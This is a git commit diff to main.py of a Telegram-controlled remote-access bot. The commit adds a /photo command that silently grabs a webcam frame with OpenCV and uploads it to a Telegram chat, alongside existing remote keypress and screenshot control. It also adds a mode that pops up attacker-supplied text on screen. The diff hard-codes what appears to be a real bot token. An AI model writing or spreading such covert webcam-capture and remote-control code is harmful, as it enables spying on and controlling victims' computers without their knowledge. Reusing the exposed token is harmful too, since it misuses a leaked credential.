2a905969a21726e7434537d32eda4b0d4922d21e
oddity seeker <138159375+oddityseeker@users.noreply.github.com>
2024-03-25 19:15:10 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,13 +1,16 @@
 import pyautogui
+import pyscreeze
 import tkinter
 import telebot
 from tkinter import messagebox
 from telebot import types
+import cv2
+import os
 
 x=0
 y=0
 fl = 0
-token=""
+token="7151551126:AAHxQ0-ZSd4L_6DIU8RixTGHKczPrwDcUts"
 
 bot=telebot.TeleBot(token)
 
@@ -52,6 +55,24 @@ def mess(message):
     global fl
     fl = 5
 
+@bot.message_handler(commands=['open'])
+def mes11(message):
+    global fl
+    fl = 7
+
+@bot.message_handler(commands=['photo'])
+def mes12(message):
+    try:
+        cap = cv2.VideoCapture(0)
+    finally:
+        screen(message)
+        ret, frame = cap.read()
+        cv2.imwrite('captured_image.jpg', frame)
+        with open('captured_image.jpg', 'rb') as photo:
+            bot.send_photo(chat_id='CHAT_ID', photo=photo)
+        os.remove('captured_image.jpg')
+        cap.release()
+
 
 @bot.message_handler()
 def aaa(message):
@@ -93,6 +114,15 @@ def aaa(message):
          pyautogui.press(str(text))
         finally:
          screen(message)
+    if fl == 7:
+        text = message.text
+        window = tkinter.Tk()
+        window.title("<0041>")
+        lbl = tkinter.Label(window, text = text, font=("Arial Bold", 50))
+        lbl.grid(column=0, row=0)
+        window.mainloop()
+        fl = 0
+        screen(message)
     else:
         screen(message)
 bot.polling(none_stop=True)
